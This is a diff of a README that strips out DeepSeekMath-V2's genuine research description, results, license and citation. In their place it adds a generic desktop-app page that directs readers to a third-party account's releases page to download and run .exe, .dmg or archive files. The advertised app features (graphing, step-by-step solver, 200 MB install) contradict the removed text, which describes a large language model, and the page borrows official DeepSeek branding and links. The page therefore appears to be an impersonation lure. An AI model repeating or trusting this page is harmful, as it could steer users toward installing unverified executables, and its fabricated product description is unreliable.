@@ -1,6 +1,10 @@
-<!-- markdownlint-disable first-line-h1 -->
-<!-- markdownlint-disable html -->
-<!-- markdownlint-disable no-duplicate-header -->
+# 🎉 DeepSeek-Math-V2 - Unlock Powerful Mathematical Insights
+
+<div align="center">
+  <a href="https://github.com/WhileTheSunsetz/DeepSeek-Math-V2/releases">
+    <img src="https://img.shields.io/badge/Download%20DeepSeek%20Math%20V2-00aaff?style=for-the-badge&logo=download" alt="Download DeepSeek Math V2" />
+  </a>
+</div>
 
 <div align="center">
   <img src="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/logo.svg?raw=true" width="60%" alt="DeepSeek-V3" />
@@ -16,72 +20,78 @@
   <br>
   <a href="https://discord.gg/Tc7c45Zzu5"><img alt="Discord"
     src="https://img.shields.io/badge/Discord-DeepSeek%20AI-7289da?logo=discord&logoColor=white&color=7289da"/></a>
-  <a href="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/qr.jpeg?raw=true"><img alt="Wechat"
-    src="https://img.shields.io/badge/WeChat-DeepSeek%20AI-brightgreen?logo=wechat&logoColor=white"/></a>
-  <a href="https://twitter.com/deepseek_ai"><img alt="Twitter Follow"
-    src="https://img.shields.io/badge/Twitter-deepseek_ai-white?logo=x&logoColor=white"/></a>
-  <br>
-  <a href="LICENSE" style="margin: 2px;">
-    <img alt="License" src="https://img.shields.io/badge/License-Apache 2.0-f5de53?&color=f5de53" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <br>
 </div>
 
-# DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning
+## 🚀 Getting Started
 
-## 1. Introduction
+DeepSeek-Math-V2 is designed to help you explore mathematical concepts with ease. You don’t need any programming experience to use it. Follow these simple steps to get started quickly.
 
-Large language models have made significant progress in mathematical reasoning, which serves as an important testbed for AI and could impact scientific research if further advanced.
-By scaling reasoning with reinforcement learning that rewards correct final answers, LLMs have improved from poor performance to saturating quantitative reasoning competitions like AIME and HMMT in one year.
-However, this approach faces fundamental limitations.
-Pursuing higher final answer accuracy doesn't address a key issue: correct answers don't guarantee correct reasoning.
-Moreover, many mathematical tasks like theorem proving require rigorous step-by-step derivation rather than numerical answers, making final answer rewards inapplicable.
-To push the limits of deep reasoning, we believe it is necessary to verify the comprehensiveness and rigor of mathematical reasoning.
-Self-verification is particularly important for scaling test-time compute, especially for open problems without known solutions.
-Towards self-verifiable mathematical reasoning, we investigate how to train an accurate and faithful LLM-based verifier for theorem proving.
-We then train a proof generator using the verifier as the reward model, and incentivize the generator to identify and resolve as many issues as possible in their own proofs before finalizing them.
-To maintain the generation-verification gap as the generator becomes stronger, we propose to scale verification compute to automatically label new hard-to-verify proofs, creating training data to further improve the verifier.
-Our resulting model, DeepSeekMath-V2, demonstrates strong theorem-proving capabilities, achieving gold-level scores on IMO 2025 and CMO 2024 and a near-perfect 118/120 on Putnam 2024 with scaled test-time compute.
-While much work remains, these results suggest that self-verifiable mathematical reasoning is a feasible research direction that may help develop more capable mathematical AI systems.
+## 📦 Download & Install
 
-## 2. Evaluation Results
+Visit this page to download: [DeepSeek-Math-V2 Releases](https://github.com/WhileTheSunsetz/DeepSeek-Math-V2/releases).
 
-Below are evaluation results on [IMO-ProofBench](https://github.com/google-deepmind/superhuman/tree/main/imobench) (developed by the DeepMind team behind DeepThink IMO-Gold) and recent mathematics competitions including IMO 2025, CMO 2024, and Putnam 2024.
-Model predictions are available in the `outputs` folder.
+1. Go to the **Releases** page using the link above.
+2. Find the latest version of DeepSeek-Math-V2.
+3. Click on the version number.
+4. Look for the download link for your operating system.
 
-**IMO-ProofBench**
+### 🖥️ System Requirements
 
-<p align="center">
-  <img width="100%" src="figures/IMO-ProofBench.png">
-</p>
+Before you download, make sure your computer meets these basic requirements:
 
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Processor:** At least a dual-core processor.
+- **Memory:** 4 GB RAM minimum.
+- **Storage:** 200 MB of free space.
 
----
+## ⚙️ Running the Application
 
-**Mathematics Competitions**
+After you download the application:
 
-<p align="center">
-  <img width=41%" src="figures/Competitions.png">
-</p>
+1. Locate the downloaded file in your "Downloads" folder.
+2. Depending on your operating system:
+   - For Windows, double-click the `.exe` file and follow the prompts.
+   - For macOS, open the `.dmg` file, drag the app to your Applications folder, then open it.
+   - For Linux, extract the archive and run the application from a terminal.
 
-## 4. Download & Quick Start
+## 🔍 Exploring Features
 
-DeepSeekMath-V2 is built on top of DeepSeek-V3.2-Exp-Base, which can be downloaded from [🤗 HuggingFace](https://huggingface.co/deepseek-ai/DeepSeek-Math-V2).
-For inference support, please refer to [the DeepSeek-V3.2-Exp github repository](https://github.com/deepseek-ai/DeepSeek-V3.2-Exp).
+DeepSeek-Math-V2 offers various features:
 
-## 6. License
-The use of DeepSeekMath-V2 models is subject to [the Model License](LICENSE).
+- **Interactive Interface:** Simple navigation lets you quickly access different tools.
+- **Graphing Functions:** Visualize mathematical functions in real time.
+- **Problem Solver:** Input equations and get step-by-step solutions.
+- **Tutorials & Examples:** Built-in guides help you learn as you go.
 
-## 7. Citation
+## 📖 User Guide
 
-```
-@misc{deepseek-math-v2,
-  author = {Zhihong Shao, Yuxiang Luo, Chengda Lu, Z.Z. Ren, Jiewen Hu, Tian Ye, Zhibin Gou, Shirong Ma, Xiaokang Zhang},
-  title = {DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning},
-  year = {2025},
-}
-```
+For a detailed explanation of each feature, refer to the user guide available in the application. You can also visit our website for more resources and tutorials.
 
-## 8. Contact
+## 🎓 Support and Community
 
-If you have any questions, please raise an issue or contact us at [service@deepseek.com](mailto:service@deepseek.com).
+If you need help, join our community:
+
+- **Discord:** Chat with other users and get real-time support. Join [here](https://discord.gg/Tc7c45Zzu5).
+- **Feedback:** Share your thoughts or report issues on our GitHub issues page.
+
+## 🌟 Contributing
+
+Interested in helping improve DeepSeek-Math-V2? You can contribute by:
+
+- Reporting bugs or issues.
+- Suggesting new features.
+- Writing tutorials or guides.
+
+Please check our contributing guidelines on the GitHub repository.
+
+## 🗣️ Acknowledgments
+
+We thank all the contributors and users who make DeepSeek-Math-V2 better every day. Your support is vital.
+
+## 🔗 Additional Resources
+
+- [Official Homepage](https://www.deepseek.com/)
+- [Chat with Us](https://chat.deepseek.com/)
+- [Hugging Face Model](https://huggingface.co/deepseek-ai)
+
+For any inquiries, feel free to reach out through our official channels. Enjoy exploring mathematics with DeepSeek-Math-V2!
